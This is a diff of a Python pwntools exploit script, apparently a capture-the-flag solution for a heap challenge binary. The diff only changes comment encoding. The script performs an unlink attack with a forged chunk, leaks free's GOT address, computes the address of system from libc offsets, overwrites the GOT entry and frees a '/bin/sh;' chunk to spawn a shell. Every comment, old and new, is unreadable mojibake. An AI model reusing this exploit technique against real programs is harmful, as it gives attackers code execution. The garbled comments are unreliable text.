@@ -8,7 +8,7 @@ def list_sh():
     p.recvuntil('>')
     p.sendline('1')
     p.recvuntil('SHELLC0DE 0: ')
-    recv_addr = p.read(8 * 2) #ÕâÀï×¢Òâ¶Ô¶ÁÈ¡µÄµØÖ·½øĞĞÊÊµ±µÄ×ª»»
+    recv_addr = p.read(8 * 2) #è¿™é‡Œæ³¨æ„å¯¹è¯»å–çš„åœ°å€è¿›è¡Œé€‚å½“çš„è½¬æ¢
     ret_addr = ''
     for i in range(8):
         ret_addr += recv_addr[2*i+1] + recv_addr[2*i]
@@ -24,7 +24,7 @@ def new_sh(sh_str):
     p.recvuntil(':')
     p.send(sh_str)
     p.recvuntil('Successfully created a new shellcode.')
-    
+
 
 def edit_sh(number, sh_str):
     p.recvuntil('>')
@@ -43,49 +43,48 @@ def del_sh(number):
     p.sendline(str(number))
 
 def main():
-    # ´´½¨Á½¸öchunk
+    # åˆ›å»ºä¸¤ä¸ªchunk
     first_size = 0xa0
     second_size = 0xa0
     new_sh('A'*first_size)
     new_sh('B'*second_size)
     new_sh('/bin/sh;')
-    # ¹¹ÔìµÚÒ»¸öÇøµÄĞÅÏ¢
+    # æ„é€ ç¬¬ä¸€ä¸ªåŒºçš„ä¿¡æ¯
     PREV_IN_USE = 0x1
     prev_size_0 =   p64(0)
     size_0      =   p64(first_size | PREV_IN_USE)
     fd_0        =   p64(0x6016d0 - 0x18)
-    bk_0        =   p64(0x6016d0 - 0x10)            # 0x6016c0¿ÉÒÔ´Óbss¶ÎÕÒµ½ ¼ÓÉÏflag ºÍ lengthµÄÆ«ÒÆ¾ÍÊÇµÚÒ»¸öname_ptrÁË
-    data_0      =   'p'*(first_size-0x20)           # È¥µôheader ÕâÀïÊÇ¹¹Ôìchunk0Îªfree chunk ËùÒÔËãÉÏfdºÍbk
+    bk_0        =   p64(0x6016d0 - 0x10)            # 0x6016c0å¯ä»¥ä»bssæ®µæ‰¾åˆ° åŠ ä¸Šflag å’Œ lengthçš„åç§»å°±æ˜¯ç¬¬ä¸€ä¸ªname_pträº†
+    data_0      =   'p'*(first_size-0x20)           # å»æ‰header è¿™é‡Œæ˜¯æ„é€ chunk0ä¸ºfree chunk æ‰€ä»¥ç®—ä¸Šfdå’Œbk
     prev_size_1 =   p64(first_size)
-    size_1      =   p64(second_size + 0x10)         # 0x10Îªheader´óĞ¡ ÒòÎª²»ÊÇfree chunk ËùÒÔÃ»ÓĞfdºÍbk
+    size_1      =   p64(second_size + 0x10)         # 0x10ä¸ºheaderå¤§å° å› ä¸ºä¸æ˜¯free chunk æ‰€ä»¥æ²¡æœ‰fdå’Œbk
     payload1 = prev_size_0 + size_0 + fd_0 + bk_0 + data_0  #first fake free chunk
     payload1 += prev_size_1 + size_1                        #second chunk header
-    edit_sh(0, payload1)            # ¸²¸Çchunk
-    # ´¥·¢unlink
+    edit_sh(0, payload1)            # è¦†ç›–chunk
+    # è§¦å‘unlink
     del_sh(1);
     free_got_addr = 0x0000000000601600
-    # *0x6016d0 = 0x6016d0 - 0x18 ¼´shell_0µÄname_ptrÒÑ¾­±ä³ÉÁËshell_0µÄÊ×µØÖ·
-    rubbish = p64(0x0)                              # ÕâÀï´Ó³ÌĞò¿´ 0x6010b8 ÊÇÎŞ¹Ø½ôÒªµÄ
+    # *0x6016d0 = 0x6016d0 - 0x18 å³shell_0çš„name_ptrå·²ç»å˜æˆäº†shell_0çš„é¦–åœ°å€
+    rubbish = p64(0x0)                              # è¿™é‡Œä»ç¨‹åºçœ‹ 0x6010b8 æ˜¯æ— å…³ç´§è¦çš„
     is_shellcode_exist = p64(0x1)                   # flag
-    shellcode_size = p64(0xa)                       # Òª´òÓ¡µÄ×Ö·û´®³¤¶È 10*%02x
-    libc_free_got = p64(free_got_addr)              # got±íÖĞfreeµÄµØÖ·
+    shellcode_size = p64(0xa)                       # è¦æ‰“å°çš„å­—ç¬¦ä¸²é•¿åº¦ 10*%02x
+    libc_free_got = p64(free_got_addr)              # gotè¡¨ä¸­freeçš„åœ°å€
     payload2 = rubbish + is_shellcode_exist + shellcode_size + libc_free_got
     # leak
     edit_sh(0, payload2)
     free_address = list_sh()
     print "free_address:", hex(free_address)
-    # ¼ÆËãsystemµØÖ·
-    lib_sys_addr =  0x0000000000046590      # Èç¹ûÔÚ±¾»ú²âÊÔ, ÓÃldd²é¿´ÏÂ³ÌĞò×°ÔØµÄso¿â, È»ºóµ½¸Ã¿âÖĞobjdump -T ²éÕÒ¶ÔÓ¦º¯Êı¾ÍºÃÁË
+    # è®¡ç®—systemåœ°å€
+    lib_sys_addr =  0x0000000000046590      # å¦‚æœåœ¨æœ¬æœºæµ‹è¯•, ç”¨lddæŸ¥çœ‹ä¸‹ç¨‹åºè£…è½½çš„soåº“, ç„¶ååˆ°è¯¥åº“ä¸­objdump -T æŸ¥æ‰¾å¯¹åº”å‡½æ•°å°±å¥½äº†
     lib_free_addr = 0x0000000000082d00
-    #lib_sys_addr =  0x46640                # ÕâÀïÊÇÔÚÌá¹©µÄsoÖĞÕÒµ½µÄ
+    #lib_sys_addr =  0x46640                # è¿™é‡Œæ˜¯åœ¨æä¾›çš„soä¸­æ‰¾åˆ°çš„
     #lib_free_addr = 0x82df0
     system_addr = free_address - lib_free_addr + lib_sys_addr
     print "system_addr:", hex(system_addr)
-    # ĞŞ¸Ägot±íÖĞfreeµØÖ·Îªsystem
+    # ä¿®æ”¹gotè¡¨ä¸­freeåœ°å€ä¸ºsystem
     edit_sh(0, p64(system_addr))
-    # ´¥·¢free(Êµ¼ÊÉÏÒÑ¾­ĞŞ¸Ä³ÉÁËsystem)
+    # è§¦å‘free(å®é™…ä¸Šå·²ç»ä¿®æ”¹æˆäº†system)
     del_sh(2)
     p.interactive()
 
 main()
-
